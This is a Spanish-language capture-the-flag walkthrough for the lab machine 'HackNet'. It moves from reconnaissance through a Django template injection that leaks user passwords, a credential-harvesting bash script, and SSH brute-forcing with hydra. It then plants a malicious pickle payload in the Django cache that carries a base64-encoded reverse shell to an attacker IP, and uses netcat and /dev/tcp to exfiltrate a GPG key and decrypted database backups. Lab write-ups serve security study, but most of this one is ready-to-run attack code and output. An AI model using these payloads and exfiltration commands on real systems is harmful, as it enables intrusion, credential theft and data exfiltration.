# HACKNET

<img width="669" height="552" alt="image" src="https://github.com/user-attachments/assets/cfa82658-570f-4d66-81a1-6b36fcf69e12" />

# Reconocimento

```bash
nmap -Pn -n -sS -p- -sCV --min-rate 5000 10.10.11.85
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 21:27 -03
Nmap scan report for 10.10.11.85
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
```

* Agregamos el dominio reportado a nuestro archivo /etc/hosts y accedemos al servicio web

```bash
echo '10.10.11.85 hacknet.htb' >> /etc/hosts
```

<img width="1920" height="1054" alt="image" src="https://github.com/user-attachments/assets/82aa8d64-1cb0-4f5f-a81a-31b57f6fe529" />

* revisamos las tecnologias detras de la web

<img width="1012" height="558" alt="image" src="https://github.com/user-attachments/assets/53b92b2d-a1c4-4af0-975d-7ff57b4bf34b" />

* Continuamos con el registro de un usuario y accedemos

<img width="2552" height="1077" alt="image" src="https://github.com/user-attachments/assets/fed8cf82-7aae-40d2-9138-8587fbfb1ff6" />

* Aqui podemos editar los datos del usuario incluso cargar una foto de perfil, pero como esto es desarrollado con `python` no vamos intentar cargar archivos, nuestro vector se centrara en  la inyección de plantillas SSTI, revisamos un poco la web a ver su funcionamiento

  
<img width="1600" height="675" alt="image" src="https://github.com/user-attachments/assets/6b904f3b-5fae-4a61-812b-650368440864" />

* Podemos dar Like a las pubblicaciones pero no podemos comentar si no agregamos a los usuarios como contactos, lo importante es que al dar like y consultar los usuarios que dieron like podemos ver nuestro usuario, asi que vamos a testear cambiando nuestro nombre de usuario por {{ users }}

<img width="2552" height="1077" alt="image" src="https://github.com/user-attachments/assets/398c50a3-1662-4b3b-9235-247d728f53a2" />

* volvemos al explore e inspeccionamos la web para ver el comportamiento cuando damos like y consultamos los usuarios que han dado like al post

<img width="2552" height="1077" alt="image" src="https://github.com/user-attachments/assets/859611f3-17f1-4767-a1d8-f5c9bde4416f" />

* accedamos a `http://hacknet.htb/likes/22`

<img width="2552" height="1077" alt="image" src="https://github.com/user-attachments/assets/97328b27-0a4c-4424-a0f4-ad5a327d1026" />

* ahora veamos a revisar el codigo fuente

<img width="2552" height="1077" alt="image" src="https://github.com/user-attachments/assets/1af142b7-3a18-4635-97a9-b34b96b31167" />

* aqui podemos ver que la inyeccion funciona con el renderizado de nuestro usuario con el nombre `{{ users }}`, se puede observar que se trata de una lista de usuarios (QuerySet) y que cada elemento es un SocialUser-objeto. Ahora vamos obtiener los campos y valores de los objeto de la lista y para esto vamos a necesitar cambiar el nombre de nuestro usuario por `{{ users.values }}`

<img width="2552" height="1077" alt="image" src="https://github.com/user-attachments/assets/d4de55ef-b097-4d1e-8fdd-81e29154002a" />

* A continuacion, vamos a realizar la misma accion de antes; vamos a explore, abrimos el menú de desarrollo, le damos like a cualquier publicacion y consultamos los likes

<img width="2552" height="1077" alt="image" src="https://github.com/user-attachments/assets/5998b12b-9c37-41e3-afb6-2b5785963395" />

* accedemos al link `http://hacknet.htb/likes/10` y observamos el codigo fuente

<img width="2552" height="460" alt="image" src="https://github.com/user-attachments/assets/319aa52c-673c-4162-8fb0-af34dbd9cd8a" />


* aqui podemos ver como es posible extraer la informacion de los usuarios que han dado like al post, podemos ver correo, usuario y password en texto plano, asi que vamos a desarrollar un script para automatizar la extraccion de credenciales

```bash
#!/bin/bash

url="http://hacknet.htb"
headers='Cookie: csrftoken=8mTIHGXOfS1Ra6dnuauSopspqstSkHdG; sessionid=mlszszq7qqdh4eaanqkzaud2eznnux8r'
all_users_file="all_users.txt"
temp_file="temp_response.txt"

> "$all_users_file"

for i in {1..30}; do
    echo -ne "Procesando posts... [$i/30]\r"

    curl -s -H "$headers" "${url}/like/${i}" > /dev/null

    curl -s -H "$headers" "${url}/likes/${i}" -o "$temp_file"

    last_title=$(grep -o '<img [^>]*title="[^"]*"' "$temp_file" | tail -1 | sed 's/.*title="\([^"]*\)".*/\1/' | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g; s/&#x27;/\'"'"'/g')

    if [[ ! "$last_title" == *"QuerySet"* ]]; then
        curl -s -H "$headers" "${url}/like/${i}" > /dev/null
        curl -s -H "$headers" "${url}/likes/${i}" -o "$temp_file"
        last_title=$(grep -o '<img [^>]*title="[^"]*"' "$temp_file" | tail -1 | sed 's/.*title="\([^"]*\)".*/\1/' | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g; s/&#x27;/\'"'"'/g')
    fi

    emails=$(echo "$last_title" | grep -o "'email': '[^']*'" | sed "s/'email': '\([^']*\)'/\1/g")
    passwords=$(echo "$last_title" | grep -o "'password': '[^']*'" | sed "s/'password': '\([^']*\)'/\1/g")

    while IFS= read -r email && IFS= read -r p <&3; do
        if [[ -n "$email" && -n "$p" ]]; then
            username=$(echo "$email" | awk -F'@' '{print $1}')
            echo "${username}:${p}" >> "$all_users_file"
        fi
    done < <(echo "$emails") 3< <(echo "$passwords")
    
    sleep 0.5
done

echo "=== CREDENCIALES ENCONTRADAS ==="
sort -u "$all_users_file"

rm -f "$temp_file" "$all_users_file"
```

* ejecutamos el script y obtenemos credenciales

<img width="1600" height="322" alt="image (1)" src="https://github.com/user-attachments/assets/0c2a86ad-2892-4fd8-8510-96b98b8a3e95" />


ahora voamos a testear si alguno tiene acceso a `ssh` asi que guardamos las credenciales en un archivo para pasarlo a `hydra`

```bash
hydra -C credenciales.txt ssh://10.10.11.85
```
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 23:19:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries, ~2 tries per task
[DATA] attacking ssh://10.10.11.85:22/
[22][ssh] host: 10.10.11.85   login: **********   password: ***********
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 23:19:50
```

* Obtenida las credenciales validas accedemos via `ssh`

```bash
ssh mikey@10.10.11.85
```

## Escalada

### User mikey

<img width="1000" height="341" alt="image (2)" src="https://github.com/user-attachments/assets/45580e88-6cb8-45df-847a-b6460f6fbbe1" />


buscando en el sistema conseguimos un directorio con permisos un tanto peligrosos

```bash
find / -perm -777 -type d 2>/dev/null
```
```bash
/dev/mqueue
/dev/shm
/var/tmp
/var/tmp/django_cache
/tmp
/tmp/.XIM-unix
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.ICE-unix
/run/lock
```

nos dirigimos hacia el directorio a ver que conseguimos!!!

<img width="1000" height="341" alt="image" src="https://github.com/user-attachments/assets/0b3529cb-7c7d-4b2d-b228-a955404a5ddd" />

* Buscamos informacion acerca de la cache de `django` y conseguimos esto en internet

<img width="1100" height="988" alt="image" src="https://github.com/user-attachments/assets/205648a9-fb0d-4305-ad0a-d29f7d927551" />

* url `https://docs.djangoproject.com/en/5.2/topics/cache/`
* Despues de leer un rato la documentacion vemos de que trata la cache y como podriamos llegar a obtener `RCE`

<img width="1173" height="388" alt="image" src="https://github.com/user-attachments/assets/ef8243aa-74da-4a07-a86a-de3751e7130c" />

* Se serializa la cache, es decir, son archivos serializados con python y, al tener todos los permisos en el directorio puedo llegar a suplantar los archivos cache por archivos serializados maliciosos, solo queda averiguar que desencadena la deserializacion asi que continuamos investigando

<img width="2545" height="1035" alt="image" src="https://github.com/user-attachments/assets/a8747c4f-2acf-4b3a-b4d5-00df4d71b3b5" />

* Ahora entendemos un poco mejor la forma de trabajo, es posible configurar Django para que cachee incluso todo el sitio web o solo las partes mas pesadas y asi evitar cálculos costosos, Cuando recibe una solicitud, primero busca en la cache, si encuentra el resultado cacheado, lo devuelve directamente sin procesar, entonces tendriamos un funcionamiento asi:

 ```bash
Django > Cachea pagina web > {serializa la informacion} > crea el archivo .djcache
usuario realiza peticion a la web > Django busca la informacion en cache > si la encuentra entonces > {deserealiza la cache} > devuelve la informacion al usuario 

```

* Resumiendo, debemos ver cual peticion en la web genera los archivos cache


https://github.com/user-attachments/assets/0fe08660-d1bd-47ae-ad0b-d94cd1b18436

* Solo se cache la pestana de `explore` asi que ya sabemos que desencadenara la deserializacion, vamos a escalar

serializer.py
```python
import pickle
import os
import sys

class Malicious:
    def __reduce__(self):
        return (os.system, ('printf L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIxNi84ODg5IDA+JjEiCg==|base64 -d|bash',))

def main():
    # Verificar que se hayan proporcionado los nombres de archivo como argumentos
    if len(sys.argv) < 2:
        print("Uso: python script.py <archivo1> [archivo2]")
        sys.exit(1)
    
    # Obtener los nombres de archivo de los argumentos
    filenames = sys.argv[1:]
    
    # Crear cada archivo con el objeto serializado
    for filename in filenames:
        try:
            with open(filename, 'wb') as f:
                pickle.dump(Malicious(), f)
            print(f"Archivo creado: {filename}")
        except Exception as e:
            print(f"Error al crear {filename}: {e}")

if __name__ == "__main__":
    main()
```
* ejecutamos el script de la siguiente manera

```bash
rm -rf ./* && python3 serializer.py 1f0acfe7480a469402f1852f8313db86.djcache 90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

* Despues de ejecutar el comando anterior vamos a la web y recargamos la pestana `explore` para que Django haga su trabajo y obtengamos `RCE`

<img width="2547" height="461" alt="image" src="https://github.com/user-attachments/assets/eb347af7-fc15-47a3-a9da-5cc48860d4a7" />

### User Sandy

Hacemos un tratamiento de la tty para tener una shell mas controlable y vemos que en el directorio actual tenemos un backup

<img width="1276" height="311" alt="image" src="https://github.com/user-attachments/assets/3eba8a94-d37e-4416-8196-7bed556ca025" />

* aunque son nuestros los archivos no podemos leerlos ya que estan encriptados con `gpg` asi que vamos a nuestro directorio de trabajo


<img width="1276" height="337" alt="image" src="https://github.com/user-attachments/assets/e01fd955-d77d-4e84-9678-07e36a30a33e" />

* Nos conseguimos con el directorio `.gnupg` el cual puede estar relacionado con los archivos backup anteriores asi que accedemos y revisamos su contenido

  
<img width="1276" height="337" alt="image" src="https://github.com/user-attachments/assets/9a383a26-ef7b-44b7-90f5-315e2ffa9441" />

* Ya por aqui vemos que tenemos archivos sensibles y los cuales nos permitirian desencriptar los archivos backup anteriores, lo primero que haremos sera enviar el archivo `armored_key.asc` a nuestra maquina atacante para intentar crackear la password, si lo llegamos a lograr entonces podriamos desencriptar los backup.

* en nuestra maquina

```bash
nc -lnvp 5555 > armored_key.asc
```

* Ahora enviamos el archivos

```bash
cat armored_key.asc > /dev/tcp/10.10.14.216/5555
```
* Hemos recibido el archivo asi que ahora intentamos crackear desde nuestra maquina

```bash
gpg2john armored_key.asc > key.hash # extraemos el hash
```
```bash
john -w=/usr/share/wordlists/rockyou.txt key.hash # intentamos crackearlo
```
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s**********rt       (Sandy)     
1g 0:00:00:01 DONE (2025-09-20 14:28) 0.7194g/s 310.7p/s 310.7c/s 310.7C/s gandako..nicole1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

obtuvimos la password asi que ahora vamos intentar descifrar los backups

### Descifrado GPG

* prmiero vamos abrir 3 listener en nuestra maquina para recibir cada archivo desencriptado

```bash
nc -lnvp 5555 > back1.txt
```
```bash
nc -lnvp 5556 > back2.txt
```
```bash
nc -lnvp 5557 > back3.txt
```

* vamos importar la key, desencriptamos y enviamos a nuestra maquina

```bash
gpg --import private-keys-v1.d/armored_key.asc # importamos la key
```

```bash
gpg -o /tmp/back1.txt -d /var/www/HackNet/backups/backup01.sql.gpg && cat /tmp/back1.txt > /dev/tcp/10.10.14.216/5555 && rm -rf /tmp/back1.txt # desencriptamos y enviamos el primer backup
```
```bash
gpg --import private-keys-v1.d/armored_key.asc # importamos la key de nuevo
```
```bash
gpg -o /tmp/back2.txt -d /var/www/HackNet/backups/backup02.sql.gpg && cat /tmp/back2.txt > /dev/tcp/10.10.14.216/5556 && rm -rf /tmp/back2.txt # desencriptamos y enviamos el segundo backup
```
```bash
gpg --import private-keys-v1.d/armored_key.asc # importamos la key
```
```bash
gpg -o /tmp/back3.txt -d /var/www/HackNet/backups/backup03.sql.gpg && cat /tmp/back3.txt > /dev/tcp/10.10.14.216/5556 && rm -rf /tmp/back3.txt # desencriptamos y enviamos el tercer backup
```

>>> Nota: cada vez que desencriptemos nos pedira una password, esa password es la que obtuvimos al crackear el archivo `armored_key.asc`

* ya tenemos los 3 archivos en nuestra maquina


<img width="1276" height="337" alt="image" src="https://github.com/user-attachments/assets/bbcb637a-219b-4b4f-aacf-478d9ceab116" />

* ahora vamos a realizar filtrados para ver si obtenemos credenciales

<img width="1600" height="322" alt="image (3)" src="https://github.com/user-attachments/assets/fc4f41cb-8abd-4776-8c05-680bf1e4fa08" />

intentamos escalar a root

```bash
su root
```
<img width="1268" height="220" alt="image" src="https://github.com/user-attachments/assets/c271247f-ddf1-45d1-ad91-38ee9aa6d0ec" />


### User Root

Vamos hasta el directorio root y obtenemos la flag!!!

<img width="1268" height="220" alt="image (4)" src="https://github.com/user-attachments/assets/95629f0c-d8f9-42ab-a324-82b4934dc30a" />



















